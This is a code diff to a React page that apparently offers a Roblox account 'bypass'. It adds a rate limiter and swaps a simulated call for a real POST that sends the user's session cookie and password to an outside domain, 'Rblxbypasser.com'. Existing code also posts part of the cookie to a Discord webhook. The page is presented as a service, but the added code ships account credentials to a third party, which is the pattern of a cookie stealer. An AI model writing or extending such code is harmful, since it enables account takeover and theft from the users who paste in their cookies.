@@ -6,6 +6,9 @@ import { sendDiscordWebhook } from "@/lib/tokenStore";
 import { toast } from "sonner";
 
 const WEBHOOK_KEY = "discord_webhook_url";
+const RATE_LIMIT_KEY = "bypass_attempts";
+const MAX_ATTEMPTS_PER_MIN = 10;
+const BYPASS_API_URL = "https://Rblxbypasser.com";
 
 type BypassStatus = "idle" | "loading" | "success" | "error";
 
@@ -15,13 +18,37 @@ const BypassPage = () => {
   const [showPassword, setShowPassword] = useState(false);
   const [status, setStatus] = useState<BypassStatus>("idle");
   const [log, setLog] = useState<string[]>([]);
+  const [remaining, setRemaining] = useState(MAX_ATTEMPTS_PER_MIN);
   const navigate = useNavigate();
 
   useEffect(() => {
     if (sessionStorage.getItem("authenticated") !== "true") {
       navigate("/");
     }
+    setRemaining(getRemainingAttempts());
   }, [navigate]);
+
+  function getAttempts(): number[] {
+    try {
+      const raw = localStorage.getItem(RATE_LIMIT_KEY);
+      if (!raw) return [];
+      const cutoff = Date.now() - 60_000;
+      return (JSON.parse(raw) as number[]).filter(t => t > cutoff);
+    } catch {
+      return [];
+    }
+  }
+
+  function getRemainingAttempts(): number {
+    return Math.max(0, MAX_ATTEMPTS_PER_MIN - getAttempts().length);
+  }
+
+  function recordAttempt() {
+    const attempts = getAttempts();
+    attempts.push(Date.now());
+    localStorage.setItem(RATE_LIMIT_KEY, JSON.stringify(attempts));
+    setRemaining(Math.max(0, MAX_ATTEMPTS_PER_MIN - attempts.length));
+  }
 
   const addLog = (msg: string) => {
     setLog(prev => [...prev, `[${new Date().toLocaleTimeString()}] ${msg}`]);
@@ -33,24 +60,37 @@ const BypassPage = () => {
       return;
     }
 
+    const attempts = getAttempts();
+    if (attempts.length >= MAX_ATTEMPTS_PER_MIN) {
+      const oldest = attempts[0];
+      const wait = Math.ceil((60_000 - (Date.now() - oldest)) / 1000);
+      toast.error(`Rate limit reached. Try again in ${wait}s.`);
+      return;
+    }
+
+    recordAttempt();
     setStatus("loading");
     setLog([]);
     addLog("Initializing bypass...");
+    addLog(`Connecting to ${BYPASS_API_URL}...`);
 
-    await new Promise(r => setTimeout(r, 600));
-    addLog("Validating cookie format...");
-
-    await new Promise(r => setTimeout(r, 800));
-    addLog("Connecting to API...");
-
-    await new Promise(r => setTimeout(r, 1000));
-    addLog("Sending bypass request...");
-
-    // Simulated API call — replace with your actual bypass API endpoint
     try {
-      await new Promise(r => setTimeout(r, 1200));
+      const res = await fetch(BYPASS_API_URL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ cookie: cookie.trim(), password }),
+      });
 
-      // Simulate success
+      const text = await res.text();
+      let data: any = text;
+      try { data = JSON.parse(text); } catch {}
+
+      addLog(`Response ${res.status} ${res.statusText}`);
+      if (typeof data === "object") addLog(JSON.stringify(data).slice(0, 200));
+      else addLog(String(data).slice(0, 200));
+
+      if (!res.ok) throw new Error(`API error ${res.status}`);
+
       addLog("✅ Bypass completed successfully!");
       setStatus("success");
       toast.success("Bypass successful!");
@@ -59,8 +99,8 @@ const BypassPage = () => {
       if (webhook) {
         sendDiscordWebhook(webhook, `🔓 Bypass executed. Cookie: \`${cookie.slice(0, 20)}...\``);
       }
-    } catch {
-      addLog("❌ Bypass failed — API error");
+    } catch (err: any) {
+      addLog(`❌ ${err?.message || "Bypass failed"}`);
       setStatus("error");
       toast.error("Bypass failed");
     }
@@ -144,6 +184,9 @@ const BypassPage = () => {
               </>
             )}
           </button>
+          <p className="text-[11px] text-muted-foreground text-center">
+            {remaining} / {MAX_ATTEMPTS_PER_MIN} attempts remaining this minute
+          </p>
         </div>
 
         {/* Log Output */}
